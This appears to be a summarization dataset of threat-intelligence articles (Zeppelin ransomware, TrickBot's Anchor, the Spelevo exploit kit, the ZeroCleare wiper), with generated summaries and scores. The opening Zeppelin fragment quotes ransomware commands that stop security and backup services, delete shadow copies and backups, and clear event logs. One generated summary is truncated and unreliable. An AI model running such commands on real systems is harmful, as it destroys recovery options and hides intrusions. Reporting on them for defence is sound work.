/y,net stop ""Sophos Agent"" /y,net stop ""Sophos AutoUpdate Service"" /y,net stop ""Sophos Clean Service"" /y,net stop ""Sophos Device Control Service"" /y,net stop ""Sophos File Scanner Service"" /y,net stop ""Sophos Health Service"" /y,net stop ""Sophos MCS Agent"" /y,net stop ""Sophos MCS Client"" /y,net stop ""Sophos Message Router"" /y,net stop ""Sophos Safestore Service"" /y,net stop ""Sophos System Protection Service"" /y,net stop ""Sophos Web Control Service"" /y,net stop ""Symantec System Recovery"" /y,net stop ""Veeam Backup Catalog Data Service"" /y,net stop ""Zoolz 2 Service"" /y,net stop ARSM /y,net stop AVP /y,net stop AcrSch2Svc /y,net stop AcronisAgent /y,net stop Antivirus /y,net stop BackupExecAgentAccelerator /y,net stop BackupExecAgentBrowser /y,net stop BackupExecDeviceMediaService /y,net stop BackupExecJobEngine /y,net stop BackupExecManagementService /y,net stop BackupExecRPCService /y,net stop BackupExecVSSProvider /y,net stop DCAgent /y,net stop EPSecurityService /y,net stop EPUpdateService /y,net stop ESHASRV /y,net stop EhttpSrv /y,net stop EraserSvc11710 /y,net stop EsgShKernel /y,net stop FA_Scheduler /y,net stop IISAdmin /y,net stop IMAP4Svc /y,net stop KAVFS /y,net stop KAVFSGT /y,net stop MBAMService /y,net stop MBEndpointAgent /y,net stop MMS /y,net stop MSExchangeES /y,net stop MSExchangeIS /y,net stop MSExchangeMGMT /y,net stop MSExchangeMTA /y,net stop MSExchangeSA /y,net stop MSExchangeSRS /y,net stop MSOLAP$SQL_2008 /y,net stop MSOLAP$SYSTEM_BGC /y,net stop MSOLAP$TPS /y,net stop MSOLAP$TPSAMA /y,net stop MSSQL$BKUPEXEC /y,net stop MSSQL$ECWDB2 /y,net stop MSSQL$PRACTICEMGT /y,net stop MSSQL$PRACTTICEBGC /y,net stop MSSQL$PROD /y,net stop MSSQL$PROFXENGAGEMENT /y,net stop MSSQL$SBSMONITORING /y,net stop MSSQL$SHAREPOINT /y,net stop MSSQL$SOPHOS /y,net stop MSSQL$SQLEXPRESS /y,net stop MSSQL$SQL_2008 /y,net stop MSSQL$SYSTEM_BGC /y,net stop MSSQL$TPS /y,net stop MSSQL$TPSAMA /y,net stop MSSQL$VEEAMSQL2008R2 /y,net stop MSSQL$VEEAMSQL2008R2 /y,net stop MSSQL$VEEAMSQL2012 /y,net stop MSSQLFDLauncher /y,net stop MSSQLFDLauncher$PROFXENGAGEMENT /y,net stop MSSQLFDLauncher$SBSMONITORING /y,net stop MSSQLFDLauncher$SHAREPOINT /y,net stop MSSQLFDLauncher$SQL_2008 /y,net stop MSSQLFDLauncher$SYSTEM_BGC /y,net stop MSSQLFDLauncher$TPS /y,net stop MSSQLFDLauncher$TPSAMA /y,net stop MSSQLSERVER /y,net stop MSSQLServerADHelper /y,net stop MSSQLServerADHelper100 /y,net stop MSSQLServerOLAPService /y,net stop McAfeeEngineService /y,net stop McAfeeFramework /y,net stop McAfeeFrameworkMcAfeeFramework /y,net stop McShield /y,net stop McTaskManager /y,net stop MsDtsServer /y,net stop MsDtsServer100 /y,net stop MsDtsServer110 /y,net stop MySQL57 /y,net stop MySQL80 /y,net stop NetMsmqActivator /y,net stop OracleClientCache80 /y,net stop PDVFSService /y,net stop POP3Svc /y,net stop RESvc /y,net stop ReportServer /y,net stop ReportServer$SQL_2008 /y,net stop ReportServer$SYSTEM_BGC /y,net stop ReportServer$TPS /y,net stop ReportServer$TPSAMA /y,net stop SAVAdminService /y,net stop SAVService /y,net stop SDRSVC /y,net stop SMTPSvc /y,net stop SNAC /y,net stop SQLAgent$BKUPEXEC /y,net stop SQLAgent$CITRIX_METAFRAME /y,net stop SQLAgent$CXDB /y,net stop SQLAgent$ECWDB2 /y,net stop SQLAgent$PRACTTICEBGC /y,net stop SQLAgent$PRACTTICEMGT /y,net stop SQLAgent$PROD /y,net stop SQLAgent$PROFXENGAGEMENT /y,net stop SQLAgent$SBSMONITORING /y,net stop SQLAgent$SHAREPOINT /y,net stop SQLAgent$SOPHOS /y,net stop SQLAgent$SQLEXPRESS /y,net stop SQLAgent$SQL_2008 /y,net stop SQLAgent$SYSTEM_BGC /y,net stop SQLAgent$TPS /y,net stop SQLAgent$TPSAMA /y,net stop SQLAgent$VEEAMSQL2008R2 /y,net stop SQLAgent$VEEAMSQL2008R2 /y,net stop SQLAgent$VEEAMSQL2012 /y,net stop SQLBrowser /y,net stop SQLSERVERAGENT /y,net stop SQLSafeOLRService /y,net stop SQLTELEMETRY /y,net stop SQLTELEMETRY$ECWDB2 /y,net stop SQLWriter /y,net stop SamSs /y,net stop SepMasterService /y,net stop ShMonitor /y,net stop SmcService /y,net stop Smcinst /y,net stop SntpService /y,net stop SstpSvc /y,net stop TmCCSF /y,net stop TrueKey /y,net stop TrueKeyScheduler /y,net stop TrueKeyServiceHelper /y,net stop UI0Detect /y,net stop VeeamBackupSvc /y,net stop VeeamBrokerSvc /y,net stop VeeamCatalogSvc /y,net stop VeeamCloudSvc /y,net stop VeeamDeploySvc /y,net stop VeeamDeploymentService /y,net stop VeeamEnterpriseManagerSvc /y,net stop VeeamHvIntegrationSvc /y,net stop VeeamMountSvc /y,net stop VeeamNFSSvc /y,net stop VeeamRESTSvc /y,net stop VeeamTransportSvc /y,net stop W3Svc /y,net stop WRSVC /y,net stop bedbg /y,net stop ekrn /y,net stop kavfsslp /y,net stop klnagent /y,net stop macmnsvc /y,net stop masvc /y,net stop mfefire /y,net stop mfemms /y,net stop mfevtp /y,net stop mozyprobackup /y,net stop msftesql$PROD /y,net stop ntrtscan /y,net stop sacsvr /y,net stop sophossps /y,net stop svcGenericHost /y,net stop swi_filter /y,net stop swi_service /y,net stop swi_update /y,net stop swi_update_64 /y,net stop tmlisten /y,net stop wbengine /y,net stop wbengine /y,bcdedit /set {default} bootstatuspolicy ignoreallfailures,bcdedit /set {default} recoveryenabled no,wbadmin delete catalog -quiet,wbadmin delete systemstatebackup,wbadmin delete systemstatebackup -keepversions:0,wbadmin delete backup,wmic shadowcopy delete,vssadmin delete shadows /all /quiet,reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /va /f,reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"" /f,reg add ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"",attrib ""%userprofile%\documents\Default.rdp"" -s -h,del ""%userprofile%\documents\Default.rdp"",wevtutil.exe clear-log Application,wevtutil.exe clear-log Security,wevtutil.exe clear-log System,sc config eventlog start=disabled,Readme File Name!!! ALL YOUR FILES ARE ENCRYPTED !!!.TXTReadme File Content:";"The ITSecurity report states that Zeppelin ransomware is a new variant of the Buran ransomware family. It is designed to encrypt files on the victim's computer and then demand a ransom for the decryption key. The malware uses a combination of AES256 encryption and RSA asymmetric encryption to protect the session key. The malware generates a pair of 512bit RSA keys for the victim and saves them to memory in the following format:<N>{privatekey_modulus_hexstr}</N><D>{privatekey_exponent_hexstr}</D><N>{publickey_modulus_hexstr}</N><E>{publickey_exponent_hexstr}</E>Figure 7: Example of encryption keys: attacker's public key (blue), generated victim's public key (green) & private key (red), their encrypted and base64 encode versions (yellow)The private key from this pair will be encrypted using the attacker's 2048bit public RSA key hardcoded in the .itext section of the binary. Both the victim's RSA encrypted private key and its corresponding public key will then be further obfuscated with a randomly generated 32byte RC4 key, base64 encoded (together with the prepended RC4 key) and saved to the registry under HKCU\Software\Zeppelin\Keys as ""Public Key"" and ""Encrypted Private Key"" respectively:Figure 8: Encryption of the victim's private keyA unique victim ID is then created using the first 11 bytes of the victim's RSA public key modulus and replacing the third and seventh character with a dash """" character. An example ID for the keys shown above would be 38904C";en;{'r': 0.08333333333333333, 'p': 0.8861788617886179, 'f': 0.1523410186942324};{'r': 0.06325932132383745, 'p': 0.7704081632653061, 'f': 0.11691831063780588};{'r': 0.08333333333333333, 'p': 0.8861788617886179, 'f': 0.1523410186942324}
https://www.sentinelone.com/labs/anchor-project-the-deadly-planeswalker-how-the-trickbot-group-united-high-tech-crimeware-apt/;The Deadly Planeswalker: How The TrickBot Group United High-Tech Crimeware & APT - SentinelLabs;"Research by: Vitali Kremez, Joshua Platt and Jason ReavesThe Wind of Time Shakes the Underground | High-Tech Cybercrime & APT | Most Sophisticated & Resourceful Crimeware GroupRead the Full ReportWhen we talk about cybercrime, we often portray a hidden, hazardous realm, which is radically different from the one that we live in. In fact, hackers and their cybercrime enterprises exist in the same world as ours and undergo the same social and economic transformations as those which shape our reality.When cybercrime emerged, it followed the rules of the late industrial age. Despite their Fin de siecle fleur of harbingers of the radically novel era, cybercriminal communities relied on standard, if not mundane operational rules of classic enterprises -- separation of functions, division of labor, focused specialization. In other words, underground malware engineers who developed information stealers most likely never had a chance or intent to talk to hackers who developed ransomware, hacktivists did not collaborate with cyber fraudsters or carders, while for-profit criminals and nation-state advanced persistent threat (APT) operatives preferred to maintain a clear separation line.Everything changed with time. Unlike its predecessor which valued separation and operational boundaries, the 21st century manifested the interconnectivity as its essential trait. Facebook, Google, Uber, all succeeded because they were able to unite the previously ""ununitable."" This strive to merge domains and cross borders became a rule for success, a natural destination of evolution. Like other humans, cybercriminals felt the zeitgeist -- they evolved accordingly. However, only one group was able to crown this evolution -- the elite ""TrickBot"" group.This story begins in the year in which the century clearly demonstrated its rapidly changing nature. 2013 -- the call for radical social change shakes the Middle East and Europe alike, the Pope announces his renunciation the first time in 700 years, the Voyager 1 exits the Solar System and reaches the interstellar medium. The transformations of cybercrime were no less fundamental. Banking malware -- a malware designed to steal financial information -- were rapidly acquiring new functions and traits consummating with the success of GameOver Zeus, also known as ""Peer-to-Peer Zeus"", cybercrime group that became known as ""Business Club.""The developers of this crimeware employed an alternative approach to their botnet -- offering it as a service for other threat actors. The GameOver Zeus service also pioneered the deployment of ransomware such as a prolific ""Cryptolocker"" responsible in millions of losses and affecting victims worldwide. Overall, GameOver Zeus was a major success in introducing a profoundly new model -- cybercrime-as-a-service (CaaS). This model was based on automation, customization, and client-oriented approach and perfectly fit the demand of the expanding postindustrial private market. The Business Club model was operated by the most wanted cybercriminal, a Russian national Evgeniy Mihailovich Bogachev, or simply known as ""Slavik"" amongst the club members fellow cybercriminals.It was only a matter of time when other groups will incorporate GameOver Zeus's innovative modeling. In 2014, two cybercrime teams and former customers and members of ""Business Club"" form separate crimeware models became known as ""Dridex"" and ""Dyre."" Both Dridex and Dyre made its way to the headlines by advancing the CaaS model and supplying various types of cybercriminals with their botnet solutions.In the meantime, Dridex and their operators, also known as ""Evil Corp,"" continues to successful experimenting with targeted highly-impactful bank fraud and ransomware operations including working with such targeted ransomware variants as ""BitPaymer"" and ""DoppelPaymer"" responsible for multiple worldwide ransomware disruptions including the PEMEX intrusion. In December 2019, the Dridex botnet operators were charged and indicted by the international law enforcement and sanctioned the leader behind Makism Yakubets, known as ""aqua,"" and its administrator Igor Turashev, known as ""nintutu,"" for their involvement in another massive more than $100-million bank fraud and ransomware operations. Notably, Yakubetz was alleged close involvement with the Russian government and the FSB operations acquiring confidential documents through cyber-enabled means and cyber-enabled operations on its behalf.In 2016, Dyre operators were alleged to be arrested in Moscow, Russia, however, their work and ideas accumulated in the tool -- TrickBot. Trickbot engineers designed the bot in such a way to plug into the Dyre backend systems seamlessly while preserving independence from the Dyre components.TrickBot Race to Perfection: The Aesthetics of Blurred LinesTrickBot was developed in 2016 as a banking malware. However, since then it has developed into something essentially different -- a flexible, universal, module-based crimeware solution. TrickBot has been evolved to specifically attack corporations. The three pillars of TrickBot's success were ironically the buzzwords of the post-industrial revolution -- automation, decentralization, and integration.Early reports on TrickBot appeared in Fall 2016. By November 2016, the malware was already tested and functional. TrickBot developers began to add new functions to cross the borders -- first, literal borders. Initially targeting Australian banks, by November 2016 TrickBot had included New Zealand, British, German, and Canadian banks into its victim list. In July 2017, TrickBot was equipped with advanced automation -- another crucial trait that characterized this malware. TrickBot was now capable of worm-like spreading within the network after the initial infection.Then the expansion of functions followed. In October 2017, the crimeware group gathered data from mail clients and scraped web-history in search of personal identifiers. Later, new password grabber modules turned TrickBot into a fully-fledged stealing tool that was able to browse Google Chrome, Mozilla Firefox, Microsoft Edge, and other applications containing passwords and credentials.As a result, by 2018, the TrickBot group was swamped by a humongous data flow from infected machines. The group faced ""big data"" problems which required them to engineer a custom solution dealing with commercial size data flows and essentially design a ""data lake"" service to process it. The group faced a paradox in which its technological efficiency was not matched by the capabilities to process and monetize the information stolen. It was this moment when the organizational and strategic talent of the operators, and, possibly, the experience of Dyre came to play.Instead of harvesting and storing the compromised information as raw material, TrickBot decided to process and index it and offer access to it as a service. For instance, the spying capability was redesigned with a new feature with which TrickBot gathered and transferred network and domain controller victim information. With this function, TrickBot could provide other groups with critical security information which was then used to prioritize victims. In other words, a TrickBot customer knew who was the least protected prey in the lists. In other instances, breaches and botnet data were indexed through the backend to track the high-value targets. In this sense, the group weaponized these infections for the potent, targeted ransomware, or as they called it a ""cryptolocker,"" which became known as ""Ryuk"" ransomware affecting and crippling industries worldwide across multiple market segments, including healthcare and aviation industries. The criminal groups used specific digital identifiers obtained via TrickBot to spot the most lucrative industry targets for their ransomware campaigns.Moreover, the group decentralized if not ""Uberized"" its operations and started to massively sublet its technical solutions to affiliate groups. TrickBot products have often used a combination with other malware including highly infective Emotet, IcedID/BokBot, and Gozi ISFB v2.The flexibility was achieved through active use of modules. The modular structure allowed TrickBot to efficiently operate in different environments which were previously separated. TrickBot and its modules acted in the following major ways:a perfect information stealer grabbing personal information, which was then sold on the underground and used privately,a banker, stealing corporate data which monetized through account takeover and card frauda distributor, delivering ransomware, anda cryptominer.By 2019, Automation, Decentralization, and Integration enabled TrickBot to introduce a game-changing model. Their domain controller harvester enabled automatic network information collection and automated lateral movement within networks, not even mentioning the completely automated process of credential harvesting. The ability to integrate different cybercrime segments allowed to perform sophisticated bank fraud operations for money laundering, engage in ransomware and tax fraud. Decentralization created a flexible business model, where TrickBot offered attack tools to vetted vendors and used the tools of others to increase the infectivity.In blurring the lines between breaches, data theft, ransomware, and cyber fraud, the group has almost reached the pinnacle, and almost united the cybercrime territories. However, there was one final challenge separating TrickBot from perfection -- the APTs.The ""Anchor"" MysteryAdvanced Persistent Threat is a type of cybercrime which is most often associated with the nation-state actors. While the attribution is often a subject of political accusations and social discussion, the APT groups are indeed extremely sophisticated and are characterized by an ultimate focus on espionage. This defines the persistence in their operations -- to accomplish their mission targets, APT teams need to secretly remain in the system, navigate and observe. APTs saw their heyday in 2016 and 2017 when professional intrusion teams performed massive operations against top-banks and attacks against the SWIFT payment system.The modus operandi of APT has targeted attacks on extremely secure networks, remaining persistent and undetected for long periods, and espionage separates them from crimeware and TrickBot which are generally are deployed merely for monetary gain. This is why it was highly unlikely that TrickBot would attempt to integrate APTs into their operations. Until a new TrickBot derivative project called ""Anchor"" was discovered.While investigating the Anchor project we observed a framework of tools that allows the actors -- potential TrickBot customers -- to leverage this framework against higher-profile victims. Some of the pieces we have found for this framework can be seen below in the form of PDB paths. Anchor consists of several segments each with a specific function:anchorInstalleranchorDeInstallerAnchorBotBin2hexpsExecutormemoryScraperThis structure is designed to secretly upload the malware and clean up all the evidence of the attack. However, the ultimate goal of this innovation is unclear until we examine other modules. From looking at any TrickBot modules we can clearly understand its purpose. But when it comes to Anchor we see a combination of functionality, tools, and methods. What is out of the question, however, is the sophistication of this technology including an integrated methodology of loading such frameworks Metasploit, Cobalt Strike, TerraLoader, and PowerShell Empire to perform further victim post-exploitation.The Anchor project combines a collection of tools -- from the initial installation tool to the cleanup meant to scrub the existence of malware on the victim machine. In other words, Anchor presents as an all-in-one attack framework designed to compromise enterprise environments using both custom and existing toolage.As described earlier, TrickBot modules are customer-based, designed for the needs of a specific criminal activity. The Anchor project is a complex and stealthy tool for targeted data extraction from secure environments and long-term persistency. Logically, this tool will be a very tempting acquisition for high-profile, possibly nation-state groups. However, the Anchor is also be used for large cyber heists and point-of-sale card theft operations leveraging its custom card scraping malware. Among the nation-state groups, only a few are interested in both data collection and financial gain, and one of them is Lazarus.Lazarus Group (also known as ""Lazarus,"" ""Hidden Cobra,"" and ""Kimsuky"") is an advanced persistent threat (APT) group comprised of operators from ""Bureau 121"" (121?), the cyber warfare division of North Korea's RGB. The group has been active since at least 2009 and is presumed to operate out of a multitude of international locations.Lazarus appears to have been interested in a variety of sectors and targets in the last eighteen months, including cryptocurrency exchanges, financial institutions, non-governmental organizations, and South Korean individuals. Many North Korea cyber operators are likely not only self-funded but also tasked with earning income for the North Korean regime, Lazarus Group has likely targeted banks cryptocurrency exchanges and users to achieve this goal.During our investigation of Anchor, we discovered the tool PowerRatankba that was previously linked to the purported North Korean group was, in fact, used in Anchor.The specific evidence pointed out that this Lazarus group toolkit was loaded via the TrickBot Anchor project pointing to the now-unmasked relationship between the tools attributed to TrickBot ""Anchor"" group and Lazarus.Uniting the Ununitible -- Crimeware Meets APTThe integration of these tools into the Anchor implies that TrickBot was able to overcome the final barrier in integrating different domains into its model. By integrating the APT approach to its model the group turned its enterprise into a holistic ecosystem of cybercrime, becoming an essentially new phenomenon. In this ecosystem, crimeware and APT are no longer siloed, on the opposite, each type of crime creates added value for the other, each becomes a force multiplier.Conclusion: The Deadly PlaneswalkerThe Anchor is not simply a new addition to a long list of TrickBot modules and projects, it is a conclusion of many years of the cybercrime evolution, a point at which all puzzles assemble. Through its history, TrickBot was adding new markets to its area of operations, steadily conquering the cybercrime world. First, it blurred the line between infostealing and bankers then between trojans and ransomware and between financial fraud and malware.Through the history of cybercrime, APT was a Kantian ""thing-in-itself"", making it an integral part of a broader business model required a technical and organizational revolution. With the Anchor project, TrickBot became this revolutioner. TrickBot and Dridex groups remained to be some of the most sophisticated crimeware groups since ""Business Club."" While Dridex's ""Evil Corp"" members were publically charged and outed responsible for over $100 million in losses, the TrickBot group continued to innovate and stay active with more diverse crimeware models than Dridex.The ability to seamlessly integrate the APT into a monetization business model is evidence of a quantum shift. By accomplishing this integration, TrickBot overtly demonstrates that they have achieved a qualitatively new level of a cybercrime enterprise, which was never seen before in magnitude and complexity superseding and dethroning the legacy of its previous inspiration and its playground known as ""Business Club.""Read the Full ReportIOCs on GitHub";"The Wind of Time Shakes the Underground | HighTech Cybercrime & APT | Most Sophisticated & Resourceful Crimeware GroupRead the Full ReportWhen we talk about cybercrime, we often portray a hidden, hazardous realm, which is radically different from the one that we live in. In fact, hackers and their cybercrime enterprises exist in the same world as ours and undergo the same social and economic transformations as those which shape our reality.When cybercrime emerged, it followed the rules of the late industrial age. Despite their Fin de siecle fleur of harbingers of the radically novel era, cybercriminal communities relied on standard, if not mundane operational rules of classic enterprises separation of functions, division of labor, focused specialization. In other words, underground malware engineers who developed information stealers most likely never had a chance or intent to talk to hackers who developed ransomware; hacktivists did not collaborate with cyber fraudsters or carders, while forprofit criminals and nationstate advanced persistent threat (APT) operatives preferred to maintain a clear separation line.Everything changed with time. Unlike its predecessor which valued separation and operational boundaries, the 21st century manifested the interconnectivity as its essential trait. Facebook, Google, Uber, all succeeded because they were able to unite the previously ""ununitable."" This strive to merge domains and cross borders became a rule for success, a natural destination of evolution. Like other humans, cybercriminals felt the zeitgeist they evolved accordingly. However, only one group was able to crown this evolution the elite ""TrickBot"" group.This story begins in the year in which the century The Dridex botnet operators were charged and indicted by the international law enforcement and sanctioned the leader behind Makism Yakubets, known as ""aqua,"" and its administrator Igor Turashev, known as ""nintutu,"" for their involvement in another massive more than $100million bank fraud and ransomware operations. Notably, Yakubetz was alleged close involvement with the Russian government and the FSB operations acquiring confidential documents through cyberenabled means and cyberenabled operations on its behalf.In 2016, Dyre operators were alleged to be arrested in Moscow, Russia; however, their work and ideas accumulated in the tool TrickBot. TrickBot engineers designed the bot in such a way to plug into the Dyre backend systems seamlessly while preserving independence from the Dyre components.TrickBot Race to Perfection: The Aesthetics of Blurred LinesTrickBot was developed in 2016 as a banking malware. However, since then it has developed into something essentially different a flexible, universal, modulebased crimeware solution. TrickBot has been evolved to specifically attack corporations. The three pillars of TrickBot's success were ironically the buzzwords of the postindustrial revolution automation, decentralization, and integration.Early reports on TrickBot appeared in Fall 2016. By November 2016, the malware was already tested and functional. TrickBot developers began to add new functions to cross the borders first, literal borders. Initially targeting Australian banks, by November 2016 TrickBot had included New Zealand, British, German, and Canadian banks into its victim TrickBot is a sophisticated malwareasaservice (MaaS) platform that enables cybercriminals to launch targeted ransomware, bank fraud, and tax fraud operations. TrickBot's modular structure allows it to efficiently operate in different environments which were previously separated. TrickBot and its modules acted in the following major ways:a perfect information stealer grabbing personal information, which was then sold on the underground and used privately,a banker, stealing corporate data which monetized through account takeover and card frauda distributor, delivering ransomware, anda cryptominer.By 2019, Automation, Decentralization, and Integration enabled TrickBot to introduce a gamechanging model. Their domain controller harvester enabled automatic network information collection and automated lateral movement within networks, not even mentioning the completely automated process of credential harvesting. The ability to integrate different cybercrime segments allowed TrickBot to perform sophisticated bank fraud operations for money laundering, engage in ransomware and tax fraud. Decentralization created a flexible business model, where TrickBot offered attack tools to vetted vendors and used the tools of others to increase the infectivity.In blurring the lines between breaches, data theft, ransomware, and cyber fraud, the group has almost reached the pinnacle, and almost united the cybercrime territories. However, there was one final challenge separating TrickBot from perfection the APTs.The ""Anchor"" MysteryAdvanced Persistent Threat is a type of cybercrime which is most often associated with the nationstate actors. While the att Thank you for your input.";en;{'r': 0.40038684719535783, 'p': 0.9561200923787528, 'f': 0.5644171737532974};{'r': 0.2952515279736718, 'p': 0.9088277858176556, 'f': 0.44570617089027453};{'r': 0.40038684719535783, 'p': 0.9561200923787528, 'f': 0.5644171737532974}
https://www.malwarebytes.com/blog/news/2019/12/spelevo-exploit-kit-debuts-new-social-engineering-trick;Spelevo exploit kit debuts new social engineering trick;Posted: December 18, 2019 byIn order to maximize infection rate, threat actors are now launching the Spelevo exploit kit with a decoy adult site, social engineering users into downloading a malicious video player.2019 has been a busy year for exploit kits, despite the fact that they haven't been considered a potent threat vector for years, especially on the consumer side. This time, we discovered the Spelevo exploit kit with its virtual pants down, attempting to capitalize on the popularity of adult websites to compromise more devices.The current Chromium-dominated browser market share favors social engineering attacks and other threats that do not require the use of exploits in order to infect users. However, we continue to see malvertising campaigns pushing drive-by downloads in our telemetry. The malicious adverts are placed on tier 2 adult websites that still drive a lot of traffic.Recently, we captured an unusual change with the Spelevo exploit kit where, after an attempt to trigger vulnerabilities in Internet Explorer and Flash Player, users were immediately redirected to a decoy adult site.Figure 1: Exploit kit used in tandem with social engineeringSpelevo EK instructs the browser to load this site, which social engineers victims into installing a video codec in order to play a movie. This appears to be an effort from the Spelevo EK operator to double his chances of compromising new machines.Spelevo EK changes its redirection URLBased on our telemetry, there are a few campaigns run by threat actors converting traffic to adult sites into malware loads. In one campaign, we saw a malvertising attack on a site that draws close to 50 million visitors a month.Figure 2: Traffic view from EK to soc. engineering siteWe collected two main payloads coming directly from Spelevo EK:Ursnif/GoziQbot/QakbotOne thing that Spelevo EK did which was a little bit different from other exploit kits is redirect victims to google.com post exploitation, typically after a 10-second delay:Figure 3: Google redirect with 10 second delayHowever, in this latest capture, we noticed that the script had been edited and that the time was increased to 60 seconds:Figure 4: Google redirect with 60 second delayThis change is important because it allows enough time for the exploit kit to run all the way and call the last URL part of the EK framework. Here, we noticed something new as well.Previously, the URL immediately following the payload had the following ending pattern: &00000111&11. Now, the new pattern is 32 characters followed by the letter 'n'.Figure 5: Redirection from EK to decoy adult siteBefore the refresh tag comes into effect, the browser is redirected to a new location, which happens to be a decoy adult site.Social engineering as backupThere is nothing special about this fake adult site, but it works really well in the context of the malvertising chain. Victims were already engaged with the content and may not even realize that an exploitation attempt just happened.Figure 6: Fake adult site tricking users with fake video codecThis time around, the site urges users to download a file called lookatmyplayer_codec.exe. Downloading video codecs to view media used to be fairly common back in the day, but isn't really the case anymore. Yet, this kind of trick still works quite well and is an alternative method to compromise users.The fake codec turns out to be Qbot/Qakbot, which is also one of the payloads distributed by Spelevo EK. In other words, the threat actor has two chances to infect victims: either via the exploit kit or fake codec.This is not the first time that exploit kit operators have included social engineering schemes. In 2017, Magnitude EK was seen pushing a fake Windows Defender notification, while Disdain EK was tricking users with a fake Flash Player update.Malwarebytes users are protected against both the exploit kit and payloads.Indicators of compromise (IOCs)Ursnif/Gozi7212b70a0cdb4607f577e627211052e37ef01036e9231d9e286fc5e40974fd42Qbot/Qakbot1814deb94c42647f946b271fe9fc2baa6adae71df2b84f4854d36eda69979f931bbde8cee82550d4d57e4d6ee8faa9cbcbc6bdabf5873e494c47a1eb671fb7b5Decoy adult sitelookatmyvideo[.]com185.251.38[.]70;NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://www.zdnet.com/article/iranian-hackers-deploy-new-zerocleare-data-wiping-malware/;Iranian hackers deploy new ZeroCleare data-wiping malware;"Security researchers from IBM said today they identified a new strain of destructive data-wiping malware that was developed by Iranian state-sponsored hackers and deployed in cyber-attacks against energy companies active in the Middle East.IBM did not name the companies that have been targeted and had data wiped in recent attacks.Instead, IBM's X-Force security team focused on analyzing the malware itself, which they named ZeroCleare.A 28-page PDF report is available on the tool's capabilities, which IBM said it closely resembles Shamoon, one of the most dangerous and destructive malware strains of the past decade. A summary of this report's main findings is in the article below.Created by xHunt and APT34Unlike many cyber-security firms, IBM's X-Force team did not shy away from attributing the malware and the attacks to a specific country -- in this case, Iran.""Based on the analysis of the malware and the attackers' behavior, we suspect Iran-based nation-state adversaries were involved to develop and deploy this new wiper,"" the IBM security team said.But unlike many previous cyber-attacks, which are usually carried out by one single group, IBM said this malware and the attacks behind appear to be the efforts of a collaboration between two of Iran's top-tier government-backed hacking units.According to IBM, the ZeroCleare malware is the brainchild of xHunt (Hive0081 in the IBM report) and APT34 (ITG13 in the IBM report, also known as Oilrig).The ZeroCleare malwareAs for the malware itself, ZeroCleare is your classic ""wiper,"" a strain of malware designed to delete as much data as possible from an infected host.Wiper malware is usually used in two scenarios. It's either used to mask intrusions by deleting crucial forensic evidence or it's used to damage a victim's ability to carry out its normal business activity -- as was the case of attacks like Shamoon, NotPetya, or Bad Rabbit.While researching the recent ZeroCleare attacks, IBM said it identified two versions of the malware. One was created for 32-bit systems and a second for 64-bit systems. Of the two, IBM said that only the 64-bit version actually worked.Researchers said that attacks usually began with the hackers executing brute-force attacks to gain access to weakly secured company network accounts.Once they gained access to a company's server account, they exploited a SharePoint vulnerability to install web shells like China Chopper and Tunna.Once attackers had a foothold inside a company, they spread laterally inside the network to as many computers as possible, where they deployed ZeroCleare as the last step of their infection.""To gain access to the device's core, ZeroCleare used an intentionally vulnerable driver and malicious PowerShell/Batch scripts to bypass Windows controls,"" IBM said.Once ZeroCleare had elevated privileges on a host, it would load EldoS RawDisk, a legitimate toolkit for interacting with files, disks, and partitions.The malware then abused this legitimate tool to ""wipe the MBR and damage disk partitions on a large number of networked devices,"" researchers said.IBM researchers pointed out that recent versions of the notorious Shamoon malware, used as recent as last year, also abused the same Eldos RawDisk toolkit for its ""destructive"" behavior. Shamoon was, too, created and operated by Iranian hackers as well, but by a different group, known as APT33 (Hive0016). It is unclear if APT33 was involved in the creation of ZeroCleare. An initial version of the IBM report claimed that APT33 and APT34 had created ZeroCleare, but this was shortly updated to xHunt and APT34, shortly after publication, suggesting that attribution is not yet 100% clear.Other artifacts and indicators of compromise detailed in IBM's report tied ZeroCleare to xHunt and APT34.Attacks happened this fall, were ""targeted""While IBM didn't share any details about ZeroCleare victims, an IBM daily threat assessment sent this fall suggests IBM first learned of this new malware and attacks around September 20.IBM said that none of the ZeroCleare attacks were opportunistic and appeared to be targeted against very specific organizations.Past Shamoon attacks targeted companies in the energy sector that were active in the Middle East region, companies that were either Saudi-based or known partners for Saudi-based oil & gas enterprises.Article updated two hours after publication to replace the name of one hacking group from APT33 to xHunt after IBM corrected its own report.The world's most famous and dangerous APT (state-developed) malware";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://securityintelligence.com/posts/new-destructive-wiper-zerocleare-targets-energy-sector-in-the-middle-east/;New Destructive Wiper ZeroCleare Targets Energy Sector in the Middle East;"IBM X-Force has been researching and tracking destructive malware in the Middle East for some time now, particularly in the industrial and energy sectors. Since the first Shamoon attacks that started impacting organizations in the region in the summer of 2012, we have been following the evolution of destructive, disk-wiping malware deployed to cause disruption.In a recent analysis, X-Force Incident Response and Intelligence Services (IRIS) discovered new malware from the wiper class, used in a destructive attack in the Middle East. We named this malware ""ZeroCleare"" per the program database (PDB) pathname of its binary file. To date, X-Force IRIS has not found any previous reporting on the ZeroCleare wiper, its indicators or elements observed in this campaign. It is possible that it is a recently developed malware and that the campaign we analyzed is one of the first to use this version.According to our investigation, ZeroCleare was used to execute a destructive attack that affected organizations in the energy and industrial sectors in the Middle East. Based on the analysis of the malware and the attackers' behavior, we suspect Iran-based nation-state adversaries were involved to develop and deploy this new wiper.Given the evolution of destructive malware targeting organizations in the region, we were not surprised to find that ZeroCleare bears some similarity to the Shamoon malware. Taking a page out of the Shamoon playbook, ZeroCleare aims to overwrite the master boot record (MBR) and disk partitions on Windows-based machines. As Shamoon did before it, the tool of choice in the attacks is EldoS RawDisk, a legitimate toolkit for interacting with files, disks and partitions. The use of EldoS isn't due to a flaw or vulnerability in that software. Nation-state groups and cybercriminals frequently use legitimate tools in ways that a vendor did not intend to accomplish malicious or destructive activity.Using EldoS RawDisk with malicious intent enabled ZeroCleare's operators to wipe the MBR and damage disk partitions on a large number of networked devices. To gain access to the device's core, ZeroCleare used an intentionally vulnerable driver and malicious PowerShell/Batch scripts to bypass Windows controls. Adding these 